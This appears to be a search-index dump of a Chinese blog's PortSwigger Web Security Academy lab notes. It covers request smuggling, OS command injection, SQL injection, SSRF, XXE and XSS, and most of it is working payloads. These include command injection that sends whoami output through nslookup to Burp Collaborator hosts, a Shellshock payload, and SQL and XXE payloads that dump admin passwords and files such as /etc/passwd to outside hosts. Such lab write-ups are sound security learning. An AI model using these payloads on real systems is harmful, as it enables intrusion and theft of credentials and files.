application/x-www-form-urlencodedContent-Length: 124Transfer-Encoding: chunked0POST / HTTP/1.1Content-Type: application/x-www-form-urlencodedContent-Length: 200Connection: closesearch=test 第一次请求标头的名称，用它来访问管理面板： 123456789101112131415POST / HTTP/1.1Host: 0a4c00e3048d07c6c2e4396b00320006.web-security-academy.netContent-Type: application/x-www-form-urlencodedContent-Length: 143Transfer-Encoding: chunked0GET /admin HTTP/1.1X-OhZACS-Ip: 127.0.0.1Content-Type: application/x-www-form-urlencodedContent-Length: 10Connection: closex=1 更改走私的请求 URL 以删除用户carlos 123456789101112131415POST / HTTP/1.1Host: 0a4c00e3048d07c6c2e4396b00320006.web-security-academy.netContent-Type: application/x-www-form-urlencodedContent-Length: 166Transfer-Encoding: chunked0GET /admin/delete?username=carlos HTTP/1.1X-OhZACS-Ip: 127.0.0.1Content-Type: application/x-www-form-urlencodedContent-Length: 10Connection: closex=1 9. Exploiting HTTP request smuggling to capture other users’ requests 利用 HTTP 请求走私来捕获其他用户的请求 访问博客文章并发表评论，抓包请求 需要慢慢增加走私请求中 Content-Length 标头的值，直到捕获整个 cooki 1234567891011121314POST / HTTP/1.1Host: 0a5f00f5030f2821c174b72d00c100e3.web-security-academy.netContent-Type: application/x-www-form-urlencodedContent-Length: 256Transfer-Encoding: chunked0POST /post/comment HTTP/1.1Content-Type: application/x-www-form-urlencodedContent-Length: 600Cookie: session=enYe7PbIpOv50lcgDeOWdEO3Ymf6m7dqcsrf=XsZYgcHX6NuQAkteJIBenpeAfd8nNMiY&amp;postId=5&amp;name=Carlos+Montoya&amp;email=carlos%40normal-user.net&amp;website=&amp;comment=comment+2 10. Exploiting HTTP request smuggling to deliver reflected XSS 利用 HTTP 请求走私来传递反射 XSS","tags":[null,null],"categories":[null]},{"title":"portswigger 靶场记录","path":"/wiki/portswigger/index.html","content":"最近闲来无事，折腾了一下 PortSwigger 实验室的各种实验，顺便做了点笔记，如果这些记录能帮到别人，那就更是一种幸事。","tags":[null],"categories":[null]},{"title":"Portswigger 靶场 | 操作系统命令注入","path":"/wiki/portswigger/os-command-injection.html","content":"OS command injection All labs | Web Security Academy (portswigger.net) 常见注入方式 分号分割 || &amp;&amp; &amp; 分割 | 管道符 \\r %d0%a0 换行 反引号解析 $() 替换 1. OS command injection, simple case OS命令注入，简单案例 **目标：**执行命令以确定当前用户的名称。whoami 过程： 用 burp 拦截数据包，有两个参数分别是产品和商店 Post 设置参数，whoami 命令用于显示自身用户名称 12341 &amp; whoami #URL 编码后1+%26+whoami+%23 2. Blind OS command injection with time delays 具有时间延迟的盲操作系统命令注入 **目标：**通过 sleep 10 秒判断出问题所在 过程： 在“反馈”界面抓包处理，分别测试name email等参数 12+%26+sleep+10+%23 &amp; sleep 10 # 3. Blind OS command injection with output redirection 带有输出重定向的盲操作系统命令注入 **目标：**通过 whomi 命令，输出重定向到/var/www/images/ 过程： 在“反馈”界面抓包处理，分别测试name email等参数 让应用程序在输出响应之前休眠 10 秒，来确认是否有盲注命令注入，测试后发现易受攻击的字段是email 可通过 F12 把 emali 的 type 改为 text，以此绕过前端检查，来提交反馈 在电子邮箱处填写&amp; whoami &gt; /var/www/images/ling.txt #，执行 whoami 命令，将内容保存在 ling.txt 访问图片网址，修改文件名成 ling.txt 12345678# 等待十秒 &amp; sleep 10 ## 将内容保存在 ling.txt&amp; whoami &gt; /var/www/images/ling.txt ## 访问https://0ab8007b0415044bc48b9b5d001e00fb.web-security-academy.net/image?filename=ling.txt 4. Blind OS command injection with out-of-band interaction 带有带外交互的盲操作系统命令注入 **目标：**利用盲操作系统命令注入漏洞向 Burp 协作者发出 DNS 查找 过程： 需要 Burp pro 而不是社区版，利用 nslookup 命令去外带出回显 nslookup 命令用于查询DNS的记录，查看域名解析是否正常，在网络故障的时候用来诊断网络问题 1234+%26+nslookup+bl0lvdghtfv8hqndmhnfu63e258vwk.oastify.com+%23# URL 解码后 &amp; nslookup bl0lvdghtfv8hqndmhnfu63e258vwk.oastify.com # 5. Blind OS command injection with out-of-band data exfiltration 带外数据泄露的盲 OS 命令注入 启用 Burp Collaborator client，复制到剪贴板；拦截和修改提交反馈的请求，修改 email 参数 12345&amp; nslookup `whoami`.kg4mmv2y7ie1qqgamf1tjgf7aygo4d.oastify.com # &amp; nslookup $(whoami).kg4mmv2y7ie1qqgamf1tjgf7aygo4d.oastify.com # ||nslookup `whoami`.kg4mmv2y7ie1qqgamf1tjgf7aygo4d.oastify.com|| 最后，在 burp 的子域名中，可以看到 DNS 交互，获得当前用户名 0","tags":[null,null],"categories":[null]},{"title":"portswigger 靶场之 SQL 注入","path":"/wiki/portswigger/sql-injection.html","content":"All labs | Web Security Academy (portswigger.net) WHERE 子句中的 SQL 注入漏洞允许检索隐藏数据 目的为查看隐藏的数据，所有产品 URL 中输入单引号，查看是否存在漏洞，服务器返回一个错误，借以得知容易受到 SQL 注入攻击 URL 中输入'+OR+1=1-- （查询字符串中空格被编码成+号） 数据库执行的 SQL 查询则为 12SELECT * FROM products WHERE category = &#x27;&#x27;or 1=1-- &#x27; AND released = 1 通过'来闭合参数，-- 来注释后半部分 bp 允许绕过登录的 SQL 注入漏洞 目的为以管理员用户登录应用程序 尝试账号密码为admin。网页显示，Invalid username or password，无效的用户名或密码，故此不知道是用户名还是密码错误。 从实验室说明中查的用户名为administrator 在Username中输入any' or 1=1 -- ，密码随便写毕竟会被注释掉 用any'来闭合参数，or一个为真即可通过，-- 是 sql 的注释语法注释掉后面的密码 在Username中输入administrator'-- ，密码随便写毕竟会被注释掉 浏览器连上代理，在登录页面用 bp 抓包，修改其参数 SQL 注入 UNION 攻击，确定查询返回的列数 目的为查找列数为多少，两种方法，可以用order by和union ORDER BY 关键字用于对结果集按照一个列或者多个列进行排序 UNION 操作符用于合并两个或多个 SELECT 语句的结果集。 URL 中输入' order by 1-- ' order by 2-- ' order by 3-- 网站正常显示 直到输入了“ ' order by 4--”，服务器抛出了一个错误，这表明试图排序的列不存在，也就是说只有 3 列 URL 中输入' union select null-- ' union select null,null-- 服务器皆返回了一个错误，这表明不只有一两列存在 ' union select null,null,null-- 网站正常显示，这说明是有三列数据存在 在 bp 中 浏览器需要进行 URL 编码，在 bp 中 可以用快捷键 Ctrl + U 来为其添加 确定列数为 3 SQL 注入 UNION 攻击，查找包含文本的列 通过枚举' order by 数字--'得知总共有 3 列数据存在 然后在' union select null,'1',null-- 的参数中替换字符串数据借以得知与哪列相匹配 错误的话，说明不是字符串类型的 成功，数据类型是“字符串” 最后替换文中所给的字符串 SQL注入 UNION 攻击，从其他表中检索数据 检索所有用户名和密码，administrator 得知数据库包列名为users username password 通过联合查询查找空字符串，' union select null,null--得知可以返回两列 测试' union select '1','2'--得知两列为字符串类型 最后通过' union select username,password from users--得知账号密码登录即可 后台 SQL 查询为 12select &amp; from products where category = &#x27;Gifts&#x27; union select username,password from users-- &#x27; AND released = 1 SQL注入UNION攻击，在单个列中检索多个值 用' order by'来迭代 ' order by 3服务器显示错误提示，得知列数为 2 通过 ' union select null,'a'-- 来看是否接收字符串类型 页面正常输出表示可以接受字符串类型 数据库 ' union select null,version()--——查询PostgreSQL数据库版本 网站返回结果，说明数据库是PostgreSQL ' union select null,@@version--——查询MySQL数据库版本 失败 在单个列中检索需要用到字符串的连接，PostgreSQL的连接为|| ' union select null,username ||'_'|| password from users-- administrator_9wif5hcpr46lfc99l2yi SQL注入攻击，查询 Oracle 上的数据库类型和版本 用' order by'来迭代找到列数 ' order by 3-- '500，实践证明列数为 2 1234-- Oracle 查询数据库版本Oracle\tSELECT banner FROM v$versionSELECT version FROM v$instance 在 URL 或者 bp 软件中输入' union select null,banner from v$version-- ' SQL注入攻击，在 MySQL 和 Microsoft 上查询数据库类型和版本 依然是 '+order+by+3--+两列 ' union select @@version,null-- SQL注入攻击，列出非 Oracle 数据库上的数据库内容 通过' union select null,null-- '查得是两列 其次确定每列的字段数据类型 查询数据库类型 PostgreSQL 查询数据库应为' union select version(),null-- '，查询结果为 200，说明数据库是PostgreSQL PostgreSQL SELECT * FROM information_schema.tables ELECT * FROM information_schema.columns WHERE table_name = ‘TABLE-NAME-HERE’` 紧接着，要列出数据库中存在的表以及这些表包含的列 表 ' union select table_name,null from information_schema.tables-- '——查询数据库的表名 一般users_开头的表名，存放着用户名和密码，所以 Ctrl + f 搜索users_ 找到了users_squiqq 列 ' union select column_name,null from information_schema.columns where table_name='users_squiqq'-- ' username_fklyld password_vqihba 检索所有的用户名和密码 ' union select username_fklyld,password_vqihba from users_squiqq-- 找到 administrator 的密码为 kb1zf7n2k5jf1gxst3q8 SQL注入攻击，列出Oracle上的数据库内容 确定列数为 2 ，' union select null,null from dual-- 数据库 Oracle 查询需要加 from dual 查看每列的数据类型 ' union select 'a','b' from dual-- ，页面 200，表明是字符型 因为数据库是“Oracle” Oracle SELECT * FROM all_tables SELECT * FROM all_tab_columns WHERE table_name = ‘TABLE-NAME-HERE’` 紧接着，要列出数据库中存在的表以及这些表包含的列 从 [SQL injection cheat sheet](SQL injection cheat sheet | Web Security Academy (portswigger.net))中找到 Oracle 的数据表是 all_tables 通过搜索 all_tables Oracle 找到表的字段名是TABLE_NAME 找到包含用户密码的表的名字 ' union select TABLE_NAME,null from all_tables-- 一般users_开头的表名，存放着用户名和密码，所以 Ctrl + f 搜索users_得到USERS_EKARCY 找到包含用户密码的列的名字 从 [SQL injection cheat sheet](SQL injection cheat sheet | Web Security Academy (portswigger.net))中找到 all_tab_columns，这是一个数据表的名字；通过搜索 all_tab_columns Oracle找到表的字段名是COLUMN_NAME ' union select COLUMN_NAME,null from all_tab_columns where table_name = 'USERS_EKARCY'-- USERNAME_VYRGKY PASSWORD_TWCYAQ 最后查询用户名和密码登录即可 ' union select USERNAME_VYRGKY,PASSWORD_TWCYAQ from USERS_EKARCY-- administrator；q6jra0hcl8lu1hmjge4m 具有条件响应的盲 SQL 注入 目标为枚举管理员密码，以管理员用户登录。如果查询有结果，页面会显示“welcome back” 首先要确认参数容易受到 SQL 注入 在 cookie 中注入参数 welcome back --&gt; true ' and 1=1-- TrackingId=fL8CZZ0ptOt9cR8T' and 1=1--，前面参数一定是 true， 1=1 也是 true no welcome back --&gt; false TrackingId=fL8CZZ0ptOt9cR8T' and 1=0--，前面参数一定是 true， 1=0 是 false。true and false = false 服务器根据' and 1=1--（true）和' and 1=0--（false）做出不同响应，所以可以使用盲注来推断数据库中的内容 确认数据库中存在用户表“users” ' and (select 'x' from users limit 1) = 'x'-- 'x' = 'x' --&gt; true；返回 welcome back limit 子句用于限制 SELECT 语句中查询的数据的数量，limit 1，限制查询结果为 1 确认用户表中有用户名字段“administrator” ' and (select username from users where username='administrator') = 'administrator'-- 'administrator' = 'administrator' --&gt; true；返回 welcome back，说明 administrator 的用户名字段存在 找到管理员用户 administrator 的密码长度 ' and (select 'a' from users where username='administrator' and length(password)&gt;1)='a'-- 'a'='a'–&gt; true；返回 welcome back send to intruder 测试对应位置的密码字符 用到一个函数，SUBSTRING(password,m,n)，password 是字段名，m 是检索的起始位置，n 是数量。SUBSTRING() 函数从字符串中提取一些字符 使用 burp 的 Cluster bomb 爆破，随即登录即可 ' and (select SUBSTRING(password,1,1) from users where username='administrator')='a'-- f9126lip1a49h41x6b17 不是很懂，参考了视频(4) SQL Injection - Lab #11 Blind SQL injection with conditional responses - YouTube 具有条件错误的盲 SQL 注入 审题 题目中依旧是给出了数据表 users，字段 username、password，账户名 administrator 本练习使用 Oracle 数据库 应用程序不会根据查询是否返回任何行而做出任何不同的响应 如果 SQL 查询导致错误，则应用程序将返回自定义错误消息。 证明参数是易受攻击的 添加' --&gt; 返回了 500 删除' --&gt; 返回了 200 ' || (select '') ||' --&gt; 返回了 500，说明数据库是 oracle database ' || (select '' from dual) ||' --&gt; 返回了 200 ' || (select '' from abcde) ||' --&gt; 返回了 500，abcde 是编造的不存在的数据表 验证该users表是否存在 '||(select '' from users where rownum = 1)||' --&gt; 200 说明了 users 是表存在的 rownum = 1 代表查询返回一行 MySQL 支持 LIMIT 语句来选取指定的条数数据 Oracle 可以使用 ROWNUM 来选取 || 在 Oracle中，|| 运算符可以将两个或两个以上的字符串连接在一起。string1 || string2 确认管理员administrator字段 '||(select case when(1=1) then to_char(1/0) else '' end from users where username='administrator' )||' --&gt; 500，验证条件（when (1=1)）是否为真，接收到错误的时候为真（1/0），即确定存在管理员字段administrator 12345casewhen (1=1) then to_char(1/0)else &#x27;&#x27;end-- 1/0 会导致错误 CASE表达式可以在 SQL 中实现if-then-else型的逻辑 123456casewhen 判断语句1 then 返回1when 判断语句2 then 返回2……else 返回nend 密码的长度 '||(select case when length(password)&gt;1 then to_char(1/0) else '' end from users where username='administrator' )||' – 500，条件（条件是密码长度大于 1）为真返回错误 最后确认密码 同样是使用SUBSTR()函数从密码中提取单个字符 '||(select case when substr(password,1,1)='a' then to_char(1/0) else'' end from users where username='administrator')||' 1234casewhen substr(password,1,1)=&#x27;a&#x27; then to_char(1/0)else &#x27;&#x27;end 输出 http 状态码为 500 的时候，说明找到了密码 administrator th7zlh5neuj8mfp5eu4e 具有时间延迟的盲 SQL 注入 首先确定数据库是哪个 '||(select sleep(10))-- ' --&gt; '||(select pg_sleep(10))-- ' --&gt; 发现需要 10s 的响应时间 12select tracking-id from tracking-tablewhere trackingid=&#x27;pvhzsNX3X3hoWEpS&#x27;||(select pg_sleep(10))-- &#x27;; 具有时间延迟和信息检索的盲SQL注入 查看是否存在 SQL 注入 x'%3BSELECT+CASE+WHEN(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END-- --&gt; 验证需要 10s 的延迟 x'%3BSELECT+CASE+WHEN(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END-- --&gt; 不延迟 %3b 是为了关闭初始查询，亦即; URL Decode 是否存在用户 administrator x'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users-- --&gt; 延迟说明存在 administrator 确认密码长度 x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)&gt;1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users-- --&gt; 延迟说明密码长度大于 1，后续直接 send to intruder，最后获知长度为 20 确认密码 依旧是使用SUBSTRING()函数，不再一一述说了 x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(5)+ELSE+pg_sleep(0)+END+FROM+users-- 带外交互的盲 SQL 注入 目的为利用 SQL 注入漏洞并导致 DNS 查找 用 bp 获得域名，点击左上角的“Burp Collaborator client”， mi8yxtn3qtnpoh63xlday2g2ltrjf8.oastify.com 1&#x27; UNION SELECT EXTRACTVALUE(xmltype(&#x27;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM &quot;http://mi8yxtn3qtnpoh63xlday2g2ltrjf8.oastify.com/&quot;&gt; %remote;]&gt;&#x27;),&#x27;/l&#x27;) FROM dual-- 1EXTRACTVALUE(xmltype(&#x27;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM &quot;http://mi8yxtn3qtnpoh63xlday2g2ltrjf8.oastify.com/&quot;&gt; %remote;]&gt;&#x27;),&#x27;/l&#x27;) EXTRACTVALUE函数接受一个XMLType实例和一个XPath表达式作为参数，并返回结果节点的标量值。 带外数据泄露的盲 SQL 注入 依旧是上个题目的套路 1&#x27; UNION SELECT EXTRACTVALUE(xmltype(&#x27;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM &quot;http://&#x27;||(SELECT password FROM users WHERE username=&#x27;administrator&#x27;)||&#x27;.pa3ibzffnv0xwjux3xrj6wdci3oucj.oastify.com/&quot;&gt; %remote;]&gt;&#x27;),&#x27;/l&#x27;) FROM dual-- 通过 XML 3编码绕过过滤器的 SQL 注入 需要装一个插件 Hackvertor。使用说明Hackvertor-Github","tags":[null,null],"categories":[null]},{"title":"portswigger 靶场之 SSRF 篇","path":"/wiki/portswigger/ssrf.html","content":"All labs | Web Security Academy (portswigger.net) 1. 针对本地服务器的基本 SSRF **易受攻击的参数是：**库存检查功能 **目标：**更改 URL 来访问http://localhost/admin并删除用户carlos 分析： URL 浏览到 /admin 目录返回一个错误，指出该目录仅可从服务器本地使用，或对已登录的管理员可用。 找到库存检查功能，打开 burp 进行拦截并发送到 repeater，库存将发出与后端 API 通信的请求。在 burp 中观察到有个参数是stockApi，有 http 字样，判断为编码后 URL。通过 Ctrl+Shift+U 对 URL 解码后，能够看到库存检查功能的 URL 路径和端口号。 查看是否有应用程序在本地主机上运行，将stockApi值换为http://localhost，发送后显示成功，点开 burp 的 Render，能够看到网站页面上有Admin panel字样，说明进入了管理面板 在 Response 中搜索 admin，可看到Admin panel的路径是/admin，把路径添加到 stockApi 上后，继续在 Response 中搜索 carlos，可看到删除的路径是/admin/delete?username=carlos 删除 carlos：http://localhost/admin/delete?username=carlos，遵循 302 重定向 检查库存功能 对 URL 进行解码 访问本地 找到了删除的路径 返回查看成功 2. 针对另一个后端系统的基本 SSRF **易受攻击的参数是：**库存检查功能 **目标：**SSRF 扫 IP 并删除用户carlos 分析： 通过 burp suite 在库存检查功能处抓包，发送到Intruder，对 IP 地址的最后一位“添加有效载荷 §”，type 填 Number，From 1 To 255 Step 1，然后 Start attack。 攻击完后通过 Status 排序，找到不一致的发送到 Repeater，在最后面添加/admin 在 Response 中搜索 carlos，可看到删除的路径是admin/delete?username=carlos 对 URL 编码后发送，遵循 302 重定向，返回即可看到已成功http://192.168.0.18:8080/admin/delete?username=carlos 通过 python 3. 带有基于黑名单的输入滤波器的 SSRF 易受攻击的参数是： 库存检查功能 目标： 访问 http://localhost/admin 的管理界面并删除用户carlos 分析： 打开 burp 抓包，修改参数为http://localhost/失败了，然后修改为http://127.0.0.1也失败了，再次修改为http://127.1，因为会自动填充缺少的两位八位字节，点击发送发现渲染出来了 这说明，没有对127.1进行正则匹配（所以设置白名单比黑名单更好） 还可以把 IP 地址进行 16 进制编码或者 8 进制 16 进制 --&gt; 7F000001 10 进制 --&gt; 2130706433 后面加入/admin，发送后失败了在 burp 中右击Convert selection对 admin 进行编码，或者大小写绕过，最后找到路径直接删除用户即可 测试 http://127.1 大小写绕过 两次 URL 编码 4. 通过开放重定向漏洞旁路过滤器的 SSRF 要点： Open redirect 分析： 抓包库存检查功能和Next produst并发送到 Repeater，重命名为 Check stock、Next product 在 Next product 中通过测试 path 参数，观察到 path 参数被放置在Location响应标头中，Location 响应标头表示 URL 需要重定向页面 应用程序先验证 stockAPI 参数的 URL 是否在允许的域中，紧接着应用程序请求 URL，触发重定向，遵循重定向，向攻击者构造的内部 URL 发出请求 stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos 拦截 重定向 重定向到管理界面 重定向到删除 5. 带外检测的盲 SSRF 在加载产品页面时用 burp 抓包，找到 Referer 标头，开启 Collaborator client 把网址替换为 Referer 6. 带有基于白名单的输入滤波器的 SSRF 要点： 利用 URL 解析中的不一致性来绕过过滤器 步骤： 首先发出请求http://loaclhost，发现响应告诉我们主机名必须是stock.weliketoshop.net 使用@在主机名之前的 URL 中嵌入凭据，参数改为http://127.0.0.1@stock.weliketoshop.net 使用两次 URL 编码后的#使 @stock.weliketoshop.net 失效。#代表网页中的一个位置，位置的标识符 发出请求http://127.0.0.1%2523@stock.weliketoshop.net即可成功。后面步骤与之前面没有差别了 7. 盲目 SSRF 与壳冲击利用 **要点：**SSRF 在 Referer， UA 带 Shell shock payload 步骤： 从 BApp Store 安装“Collaborator Everywhere”扩展，把域名添加到 Burp，以便 Collaborator Everywhere 观察 回到浏览器，浏览产品页面后点击 return，如此反复，由此产生 HTTP 交互，回到 burp，观察 HTTP 请求中的 User-Agent，并发送到 Intruder 使用 Burp Collaborator 客户端，更改 Referer 标头，http://192.168.0.1:8080 IP 地址的最后一个八位字节，添加 § 1() &#123; :; &#125;; /usr/bin/nslookup $(whoami).yac7iwqg4tsdlyai7czxo0rrcii96y.oastify.com Payloads 窗口，将 payload 类型为 Numbers，1、255、1，开始攻击 攻击完成后，回到 Burp Collaborator 客户端，点击 Poll now，能够看到 DNS 交互和操作系统用户的名称 需要输入操作系统用户的名称即可成功 安装 添加域名 观察 UA 攻击 利用 python","tags":[null,null],"categories":[null]},{"title":"Portswigger 靶场之 XML 外部实体 (XXE) 注入","path":"/wiki/portswigger/xml-external-entity-attack.html","content":"All labs | Web Security Academy (portswigger.net) 1. Exploiting XXE using external entities to retrieve files 使用外部实体利用 XXE 来检索文件 检查库存功能用 burp 截断数据包，然后松手在 HTTP History 中查看请求，转到 Repeater。 往下看，当看到 XML 的时候，应该考虑 XXE 注入。接下来就是找到注入点，具体位置有两个，一个是 productId，另一个是 storeId。 在 XML 声明和元素 stockCheck 之间插入外部实体定义。 123&lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt; ]&gt;# 定义了一个名为 xxe 的实体，它指向文件系统中的 /etc/passwd 文件。 2. Exploiting XXE to perform SSRF attacks 利用 XXE 执行 SSRF 攻击 依旧是抓包检查库存功能，会发现有一个包含 XML 的帖子请求。 声明一个外部实体，不再引用本地文件而是查看是否可以发送到 IP 地址169.254.169.254 Send 发送请求，从响应中得到目录，连续往下遍历目录，最后获得敏感信息。 3. Blind XXE with out-of-band interaction 带外交互的盲 XXE 访问产品页面，单击“检查库存”并在 Burp 中拦截请求。 定义外部实体，插入 Burp 的协作子域名。转到“子域名”选项卡，然后单击“Poll now”。 可以看到 DNS 和 HTTP 交互。它的作用是，确认我们可以让应用程序与攻击者控制的对话服务器，为带外渗透做好准备 1&lt;!DOCTYPE stockCheck [ &lt;!ENTITY xxe SYSTEM &quot;http://1hj71n3ymgjdmmtrt6ye3mqcf3lt9i.oastify.com&quot;&gt; ]&gt; 4. Blind XXE with out-of-band interaction via XML parameter entities 通过 XML 参数实体进行带外交互的盲 XXE 外带交互的盲 XXE 是通过利用 XML 解析器向==外部服务器（burp 子域）==发送数据，使得攻击者可以==通过外部服务器与目标系统进行交互==。 12345&lt;!DOCTYPE stockCheck [&lt;!ENTITY % xxe SYSTEM &quot;http://1hj71n3ymgjdmmtrt6ye3mqcf3lt9i.oastify.com&quot;&gt; %xxe; ]&gt;# 定义了一个名为 xxe 的参数实体，它指向一个远程 URL http://……# 使用了 % 操作符来引用实体，%xxe --&gt; 表示引用实体xxe# XML 文档被解析时，实体引用（%xxe; ）将会被展开并替换为实体声明中的值（也就是远程 URL），而可能导致系统被攻击者控制的服务器接管。 Quote / 参考 盲XXE（Blind XXE），它可以在没有直接访问应用程序响应的情况下，仍能从应用程序中获取敏感信息。 5. Exploiting blind XXE to exfiltrate data using a malicious external DTD 利用盲 XXE 使用恶意外部 DTD 泄露数据 12345678910&lt;!ENTITY % file SYSTEM &quot;file:///etc/hostname&quot;&gt;&lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; exfil SYSTEM &#x27;http://0abk7wm21os9liaqg27kek4ic9iz6o.oastify.com/?x=%file;&#x27;&gt;&quot;&gt;%eval;%exfil;# 定义了一个名为 file 的外部实体，它包含了 /etc/hostname 文件的内容。可以利用此实体来访问并泄露目标系统中的文件内容# 这一行定义了一个名为 eval 的外部实体，它包含了一个实体声明 exfil，该实体可将 file 实体的内容发送到攻击者控制的服务器。exfil实体的定义包括一个URL，该URL包含攻击者控制的服务器地址和将file实体的内容作为查询参数的字符串。在这种情况下，exfil实体将文件内容发送到http://0abk7wm21os9liaqg27kek4ic9iz6o.oastify.com/，并将file实体的内容作为查询参数x的值。# %eval; %exfil; 这两行将eval实体和exfil实体插入到XML文档中。攻击者可以将这些实体插入到一个合法的XML文档中，并发送给目标系统进行解析。在解析XML文档时，目标系统将解析eval实体，然后解析exfil实体，从而触发将file实体的内容发送到攻击者控制的服务器的行为。 将 DTD 文件保存在服务器上，单击“查看漏洞”并记下 URL；用 burp 截断检查库存的请求，定义外部实体 最后返回 Burp Collaborator client，会看到一些 DNS 和 HTTP 交互，特别关注 HTTP 交互，可能包含文件的内容。/etc/hostname 1&lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM &quot;https://exploit-0a57006c0302b2d5c0e221d8013c0082.exploit-server.net/exploit&quot;&gt; %xxe;]&gt; 6. Exploiting blind XXE to retrieve data via error messages 利用盲 XXE 通过错误消息检索数据 1234&lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;&lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; exfil SYSTEM &#x27;file:///invalid/%file;&#x27;&gt;&quot;&gt;%eval;%exfil; 将 DTD 文件保存在服务器上，单击“查看漏洞”并记下 URL；用 burp 截断检查库存的请求，定义外部实体，会看到一条包含文件内容错误消息 1234&lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM &quot;https://exploit-0a42007304c1c092c003856801a900e4.exploit-server.net/exploit&quot;&gt; %xxe;]&gt;# 定义了一个名为 foo 的 DTD 声明，其中包含了一个名为 xxe的 外部实体。# xxe 实体的定义包括一个 URL，该 URL 指向服务器上的一个文件，文件包含敏感信息。在这种情况下，可以将获取的信息发送到 https…… 7. Exploiting XInclude to retrieve files 利用 XInclude 检索文件 抓包检查库存功能，修改 productId 的值 12345&lt;foo xmlns:xi=&quot;http://www.w3.org/2001/XInclude&quot;&gt;&lt;xi:include parse=&quot;text&quot; href=&quot;file:///etc/passwd&quot;/&gt;&lt;/foo&gt;# 这个XML文档定义了一个名为foo的元素，并且通过XML命名空间定义了一个名为xi的前缀，它的命名空间是&quot;http://www.w3.org/2001/XInclude&quot;。然后，它使用了`xi:include`元素来指定要包含的内容，包括`parse`和`href`属性。# parse属性指定了包含的文件是以文本方式解析的，而不是XML方式解析。href属性指定了要包含的文件的路径，这里是file:///etc/passwd，也就是本地系统上的/etc/passwd文件。由于该文件包含有关用户帐户的信息，因此攻击者可以使用这种技术来收集系统信息并进行其他攻击。 8. Exploiting XXE via image file upload 通过图像文件上传利用XXE 下载一个SVG 文件（注意不要太大），上传 SVG 文件，发表评论的时候抓包，修改 SVG 文件的内容 Expand / 拓展 SVG 文件是由 XML 构成的，因此可以使用 XML 的各种功能来嵌入数据或 payload 到 SVG 图像中。由于 SVG 图像可以包含文本、图形和脚本等元素，因此可以使用这些元素来嵌入payload 123&lt;?xml version=&quot;1.0&quot; standalone=&quot;yes&quot;?&gt;&lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM &quot;file:///etc/hostname&quot; &gt; ]&gt;&lt;svg width=&quot;128px&quot; height=&quot;128px&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot; xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot; version=&quot;1.1&quot;&gt;&lt;text font-size=&quot;16&quot; x=&quot;0&quot; y=&quot;16&quot;&gt;&amp;xxe;&lt;/text&gt;&lt;/svg&gt;# 当SVG文件被处理时，xxe实体会被解析为文件/etc/hostname的内容，然后将该内容作为文本元素的内容插入到SVG图像中，从而显示该文件的内容。 9. Exploiting XXE to retrieve data by repurposing a local DTD 利用 XXE 通过重新调整本地 DTD 的用途来检索数据 抓包检查库存功能 123456789101112&lt;!DOCTYPE message [&lt;!ENTITY % local_dtd SYSTEM &quot;file:///usr/share/yelp/dtd/docbookx.dtd&quot;&gt;&lt;!ENTITY % ISOamso &#x27;&lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///etc/passwd&quot;&gt;&lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;&amp;#x25;eval;&amp;#x25;error;&#x27;&gt;%local_dtd;]&gt;# 定义名为“file”的实体，并将其设置为/etc/passwd文件的路径，然后通过将这个实体插入到另一个名为“eval”的实体中，最终触发了漏洞，导致可以读取系统上的/etc/passwd文件的内容。同时，攻击者也定义了一个名为“error”的实体，用于报告错误信息。","tags":[null,null],"categories":[null]},{"title":"portswigger 靶场之 XSS 篇(上)","path":"/wiki/portswigger/xss-part1.html","content":"APPRENTICE All labs | Web Security Academy (portswigger.net) 1. 将 XSS 反射到 HTML 上下文中，没有编码 XSS payload，自是无需多言 1&lt;script&gt;alert(1)&lt;/script&gt; 2. 将 XSS 存储到 HTML 上下文中，没有任何编码 存储型的 XSS 在留言区 3. 文档中的 DOM XSS.使用 source location.search 编写接收器 在搜索查询功能中有基于 DOM 的跨站点脚本漏洞 在搜索框输入&quot;第三个&quot;，可以发现，输入的词被放到了 JavaScript 代码中的 img 标签的 src 属性中，插入 XSS 代码的话需要先闭合，使用&quot;&gt; `，分别闭合 img 标签和 src 属性 123456789101112// 在页面输入&quot;第三个&quot;&lt;img src=&quot;/resources/images/tracker.gif?searchTerms=第三个&gt; // 插入 XSS 代码第一种方法&quot;&gt;&lt;script&gt;alert(3)&lt;/script&gt;&lt;img src=&quot;/resources/images/tracker.gif?searchTerms=&quot;&gt;&lt;script&gt;alert(3)&lt;/script&gt;&quot;&gt; // 插入 XSS 代码第二种方法// 语法：onload，事件在页面载入完成后立即触发，onload=&quot;JavaScriptCode&quot;1&quot; onload=&quot;alert(3)&lt;img src=&quot;/resources/images/tracker.gif?searchTerms=1&quot; onload=&quot;alert(3)&quot;&gt; 1234// 源代码function trackSearch(query) &#123; document.write(&#x27;&lt;img src=&quot;/resources/images/tracker.gif?searchTerms=&#x27;+query+&#x27;&quot;&gt;&#x27;);&#125; 